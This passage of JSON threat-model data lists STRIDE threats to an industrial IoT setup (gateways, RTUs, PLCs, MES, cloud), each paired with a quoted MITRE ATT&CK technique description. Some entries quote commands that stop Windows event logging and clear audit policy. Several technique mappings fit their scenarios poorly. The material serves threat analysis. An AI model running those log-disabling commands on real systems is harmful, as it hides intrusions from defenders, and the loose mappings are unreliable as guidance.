                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the gateway with a flood of illegitimate data packets.",
            "Assumptions": [
                {
                    "Assumption": "Gateway can be externally accessed",
                    "Role": "System Designer",
                    "Condition": "Inadequate access controls or firewall settings"
                },
                {
                    "Assumption": "System is not capable of differentiating between legitimate and illegitimate traffic",
                    "Role": "System Administrator",
                    "Condition": "Weak or no traffic inspection mechanisms"
                }
            ],
            "Potential Impact": "Inability of the gateway to process valid data, leading to disruption in data transmission and cloud service operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "gateway",
                "data flood",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disconnects multiple key field devices, causing a loss of communication with the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are vulnerable to physical or remote disconnection",
                    "Role": "Attacker",
                    "Condition": "Poor physical security or unauthorized remote access"
                },
                {
                    "Assumption": "No failover or redundancy mechanisms in place",
                    "Role": "System Administrator",
                    "Condition": "Lack of contingency planning for device disconnection"
                }
            ],
            "Potential Impact": "Operational disruptions due to loss of key data and control signals, leading to potential safety and efficiency risks.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "field devices",
                "disconnection",
                "communication loss"
            ],
            "mitre_technique": {
                "name": "Denial of Service",
                "description": "Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment. \n\nSome ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. (Citation: ICS-CERT April 2017) \n\nAdversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a denial of service condition. \n\nAdversaries may have prior knowledge about industrial protocols or control devices used in the environment through [Remote System Information Discovery](https://attack.mitre.org/techniques/T0888). There are examples of adversaries remotely causing a [Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816) by exploiting a vulnerability that induces uncontrolled resource consumption. (Citation: ICS-CERT August 2018) (Citation: Common Weakness Enumeration January 2019) (Citation: MITRE March 2018) ",
                "id": "attack-pattern--1b22b676-9347-4c55-9a35-ef0dc653db5b",
                "technique_id": "T0814"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain administrative access to the MES.",
            "Assumptions": [
                {
                    "Assumption": "There is an unpatched vulnerability in the MES software",
                    "Role": "System Administrator",
                    "Condition": "Vulnerability management and patching processes are insufficient"
                },
                {
                    "Assumption": "Attacker has knowledge of the vulnerability and how to exploit it",
                    "Role": "Attacker",
                    "Condition": "Security intelligence and tooling"
                }
            ],
            "Potential Impact": "Total control over the MES, allowing the attacker to manipulate production workflows and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "MES",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages weak credentials to access and control the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Credentials used for gateway access are weak or reused",
                    "Role": "System Administrator",
                    "Condition": "Poor password management policies"
                },
                {
                    "Assumption": "Attacker has the capability to perform credential stuffing or brute-force attacks",
                    "Role": "Attacker",
                    "Condition": "Access to specialized attack tools and techniques"
                }
            ],
            "Potential Impact": "Administrator-level access to the gateway, allowing the attacker to disrupt data flow and compromise encryption processes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "weak credentials",
                "gateway",
                "brute-force attacks"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to cloud services managing IIoT data by exploiting a cloud service misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are improperly configured, exposing administrative interfaces",
                    "Role": "Cloud Service Provider",
                    "Condition": "Mistakes or oversights in cloud configuration"
                },
                {
                    "Assumption": "Attacker can identify and exploit the misconfiguration",
                    "Role": "Attacker",
                    "Condition": "Advanced knowledge and reconnaissance capabilities"
                }
            ],
            "Potential Impact": "Complete control over cloud services, enabling full unauthorized access to sensitive data and system operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "misconfiguration",
                "root access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the control center by spoofing the identity of a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "An attacker has access to valid user credentials.",
                    "Role": "Attacker",
                    "Condition": "The attacker has previously phished user credentials."
                },
                {
                    "Assumption": "The attacker can communicate with the control center over the WAN.",
                    "Role": "Attacker",
                    "Condition": "The network is reachable from the internet."
                },
                {
                    "Assumption": "The control center does not use multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "The authentication method is single-factor."
                }
            ],
            "Potential Impact": "Confidentiality breach through unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Access",
                "Account Takeover",
                "Network"
            ],
            "mitre_technique": {
                "name": "VNC",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
                "technique_id": "T1021.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor spoofs the identity of a field device to gain access to the system network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker possesses or can produce valid device certificates.",
                    "Role": "Attacker",
                    "Condition": "Certificates are not securely stored or validated."
                },
                {
                    "Assumption": "The spoofed device can communicate over the network.",
                    "Role": "Attacker",
                    "Condition": "The network does not enforce strict device identification protocols."
                },
                {
                    "Assumption": "Lack of encryption on device communications.",
                    "Role": "System Administrator",
                    "Condition": "Communications are sent in plaintext or weakly encrypted."
                }
            ],
            "Potential Impact": "System integrity compromised and potential unauthorized control actions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Device Access",
                "Man-in-the-Middle",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised cloud service account to send commands to the gateway as if they originated from a legitimate source.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service user credentials are compromised.",
                    "Role": "Attacker",
                    "Condition": "Credentials are weak or have been phished."
                },
                {
                    "Assumption": "Gateway does not validate the source of commands adequately.",
                    "Role": "System Administrator",
                    "Condition": "Weak validation mechanisms on the gateway."
                },
                {
                    "Assumption": "Cloud services lack sufficient logging.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging and monitoring."
                }
            ],
            "Potential Impact": "Data integrity compromised through unauthorized command execution.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Cloud Account",
                "Command Execution",
                "Network"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data between RTUs and the control center.",
            "Assumptions": [
                {
                    "Assumption": "No encryption on data transmitted between RTUs and the control center.",
                    "Role": "System Administrator",
                    "Condition": "Data is transmitted in plaintext."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network perimeter defense is weak."
                },
                {
                    "Assumption": "Insufficient monitoring of data integrity.",
                    "Role": "System Administrator",
                    "Condition": "Logging and monitoring are inadequate."
                }
            ],
            "Potential Impact": "Integrity compromised, leading to incorrect or malicious actions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Interception",
                "Network Access",
                "Data Manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters firmware on PLCs to cause erratic behavior in the industrial processes.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical or remote access to the PLCs.",
                    "Role": "Attacker",
                    "Condition": "Weak physical security or remote access vulnerabilities."
                },
                {
                    "Assumption": "The firmware update process is not verified.",
                    "Role": "System Administrator",
                    "Condition": "Firmware updates are not cryptographically signed."
                },
                {
                    "Assumption": "No redundancy or checksum verification in PLC data.",
                    "Role": "System Administrator",
                    "Condition": "Data integrity checks are not implemented."
                }
            ],
            "Potential Impact": "Integrity and availability compromised, leading to erroneous operations.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Device Access",
                "Physical Access"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies database records in the MES to alter production workflows.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to the MES database.",
                    "Role": "Insider",
                    "Condition": "Access control policies are weak."
                },
                {
                    "Assumption": "Lack of database activity monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate monitoring of database activities."
                },
                {
                    "Assumption": "Insufficient logs to track data changes.",
                    "Role": "System Administrator",
                    "Condition": "Activity logs are not detailed or reviewed."
                }
            ],
            "Potential Impact": "Integrity compromised by altering workflows; potential disruption in production.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Database",
                "Insider Threat",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies having triggered a critical shutdown in the control center.",
            "Assumptions": [
                {
                    "Assumption": "There is no proper logging of user actions at the control center.",
                    "Role": "System Administrator",
                    "Condition": "Logging mechanisms are not comprehensive."
                },
                {
                    "Assumption": "No non-repudiation mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "System lacks non-repudiation methods like digital signatures."
                },
                {
                    "Assumption": "Weak access controls and log integrity checks.",
                    "Role": "System Administrator",
                    "Condition": "Access control policies are inadequate."
                }
            ],
            "Potential Impact": "Compromised accountability, leading to disputes and lack of trust.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Access Control",
                "User Actions",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies responsibility for any unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "Shared responsibility model not well defined.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Roles and responsibilities are vaguely defined."
                },
                {
                    "Assumption": "Inadequate logging of cloud service activities.",
                    "Role": "System Administrator",
                    "Condition": "Activity monitoring in the cloud is insufficient."
                },
                {
                    "Assumption": "No mechanisms to track data accesses.",
                    "Role": "System Administrator",
                    "Condition": "Data access logs are either not maintained or not reviewed."
                }
            ],
            "Potential Impact": "Loss of trust and accountability for data confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Cloud Services",
                "Data Access",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A third-party vendor claims their actions did not cause system downtime.",
            "Assumptions": [
                {
                    "Assumption": "Third-party activities are not logged.",
                    "Role": "System Administrator",
                    "Condition": "Vendor actions are not tracked."
                },
                {
                    "Assumption": "No contract clauses for activity monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Vendor agreements lack provisions for auditing activities."
                },
                {
                    "Assumption": "Weak monitoring of system availability and events.",
                    "Role": "System Administrator",
                    "Condition": "No comprehensive monitoring solution in place."
                }
            ],
            "Potential Impact": "Difficulty in holding parties accountable for downtime, affecting availability.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Third-Party Access",
                "System Downtime",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
